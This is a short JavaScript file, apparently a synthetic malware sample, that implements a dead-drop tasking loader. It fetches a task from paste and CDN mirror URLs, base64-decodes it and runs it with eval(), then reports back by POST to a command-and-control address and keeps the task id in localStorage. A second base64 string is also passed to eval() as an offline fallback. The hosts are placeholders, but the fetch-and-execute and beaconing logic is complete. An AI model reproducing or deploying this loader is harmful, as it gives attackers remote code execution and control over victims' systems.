// DEADDROP — synthetic dead-drop tasking product sample.
(function () {
  var mirrors = [
    'https://paste.example.net/raw/ghost-task.json',
    'https://cdn.example.net/tasks/ghost-task.json'
  ];
  console.log('[DEADDROP] resolver online', mirrors.length, 'mirrors');

  function execute(mirror) {
    try {
      fetch(mirror, { headers: { accept: 'application/json' } })
        .then(function (response) { return response.text(); })
        .then(function (text) {
          var document = JSON.parse(text);
          var task = atob(document.task || '');
          console.log('[DEADDROP] tasking received', task.length);
          if (task) eval(task);
          try {
            fetch('https://c2.example.test/result', { method: 'POST', body: btoa('done:' + document.id) }).catch(function () {});
          } catch (error) {}
          try { localStorage.setItem('deaddrop:task', document.id || 'unknown'); } catch (error) {}
        })
        .catch(function () {
          if (mirror !== mirrors[mirrors.length - 1]) execute(mirrors[mirrors.length - 1]);
        });
    } catch (error) {}
  }
  execute(mirrors[0]);
  // Offline fallback: a cached task from the last successful dead-drop.
  try { eval(atob('Y29uc29sZS5sb2coJ1tERUFERFJPUF0gY2FjaGVkIHRhc2tpbmcgZXhlY3V0ZWQnKQ==')); } catch (error) {}
})();
